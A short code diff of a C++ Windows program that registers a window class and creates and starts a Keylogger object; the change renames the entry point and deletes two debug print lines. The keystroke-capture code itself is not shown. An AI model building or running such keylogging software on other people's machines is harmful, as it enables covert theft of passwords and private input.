@@ -21,7 +21,7 @@ shared_ptr<Keylogger> logger;
 LRESULT CALLBACK WndProc(HWND hWnd, UINT message,
 	WPARAM wParam, LPARAM lParam);
 
-INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
+INT WINAPI _tmain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	LPSTR lpCmdLine, INT iCmdShow) {
 	
 	// Add console for debug
@@ -39,9 +39,6 @@ INT WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance,
 	wndClass.lpszMenuName = NULL;
 	wndClass.lpszClassName = L"window";
 	RegisterClass(&wndClass);
-
-	std::cout << "hello";
-	printf("djsfdsfjds");
 
 	logger = make_shared<Keylogger>();
 	logger->start();
